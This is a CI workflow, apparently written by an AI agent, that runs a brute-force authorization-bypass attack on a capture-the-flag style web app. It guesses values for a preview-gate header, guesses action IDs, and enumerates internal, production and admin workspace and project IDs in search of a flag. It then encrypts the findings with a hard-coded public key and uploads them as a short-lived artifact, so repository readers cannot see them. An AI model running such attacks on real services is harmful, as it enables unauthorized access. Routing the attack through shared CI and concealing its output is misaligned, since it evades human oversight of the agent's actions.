name: launchlet-part2-header-probe

on:
  push:
    branches: [agent/launchlet-part2-header-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe valid preview header across deploy targets
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json, itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out')
          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
          mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
          refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json()
          act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
          H='X-Launchlet-Preview'; public_project=boot['project']; public_ws=boot['workspace']
          baseh={'Accept':'application/json','Content-Type':'application/json'}
          project_candidates=list(dict.fromkeys([
            public_project,
            'launchlet-release-board','launchlet-prod-board','launchlet-production-board','launchlet-staging-board','launchlet-internal-board','launchlet-corp-board','launchlet-corporate-board','launchlet-admin-board','launchlet-deploy-board','launchlet-control-board','launchlet-control-plane','launchlet-ops-board','launchlet-release','launchlet-prod','launchlet-production','launchlet-staging','launchlet-internal','launchlet-corporate','launchlet-admin','launchlet-deploy','launchlet-ops','launchlet-demo-release','launchlet-demo-prod','launchlet-demo-production','launchlet-demo-board-release','launchlet-demo-board-prod','launchlet-demo-board-production','launchlet-release-demo-board','launchlet-prod-demo-board','release','prod','production','staging','internal','admin','deploy','ops','corporate','corp','preview-8b11c'
          ]))
          workspace_candidates=list(dict.fromkeys([
            public_ws,
            'ws-launchlet-release','ws-launchlet-prod','ws-launchlet-production','ws-launchlet-staging','ws-launchlet-internal','ws-launchlet-private','ws-launchlet-admin','ws-launchlet-corp','ws-launchlet-corporate','ws-launchlet-deploy','ws-launchlet-ops','ws-launchlet-control','ws-launchlet-preview','ws-launchlet-demo','ws-release','ws-prod','ws-production','ws-internal','preview-8b11c'
          ]))
          header_candidates=list(dict.fromkeys(project_candidates + [public_ws,mf['previewReceipt'],mf['build'],act['id'],'preview-8b11c']))
          result={'header_values':[],'target_hits':[],'action_tests':[]}
          # Which values are accepted as preview context?
          for hv in header_candidates:
              r=s.post(url,headers={**baseh,H:hv},json={'actionId':act['id'],'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
                  result['header_values'].append({'value':hv,'status':r.status_code,'body':r.text})
                  if 'caplag{' in r.text: break
          # Try action-id behavior after the gate is open.
          for aid in ['x','inspectDeploy','deploy','exportDeploy','inspect-deploy','act_inspectDeploy','act_6f4b9a2c1d0e8a71',mf['previewReceipt'],'preview-8b11c']:
              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':aid,'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
              result['action_tests'].append({'actionId':aid,'status':r.status_code,'body':r.text})
              if 'caplag{' in r.text: break
          # Cross-product of plausible project/workspace targets. Store only interesting differences.
          baseline_ref='preview-8b11c'; baseline_status='preview-only'
          stop=False
          for ws,proj in itertools.product(workspace_candidates,project_candidates):
              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':act['id'],'args':{'workspaceId':ws,'projectId':proj}},timeout=8,allow_redirects=False)
              txt=r.text
              interesting=False; parsed=None
              try:
                  parsed=r.json(); ins=parsed.get('inspector',{}) if isinstance(parsed,dict) else {}
                  if r.status_code!=200 or ins.get('status')!=baseline_status or ins.get('deployRef')!=baseline_ref or 'flag' in parsed or 'caplag{' in txt:
                      interesting=True
              except Exception:
                  interesting=True
              if interesting:
                  result['target_hits'].append({'workspaceId':ws,'projectId':proj,'status':r.status_code,'body':txt})
                  if 'caplag{' in txt: stop=True; break
          (out/'summary.json').write_text(json.dumps(result,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-targets-encrypted
          path: artifact/
          retention-days: 1
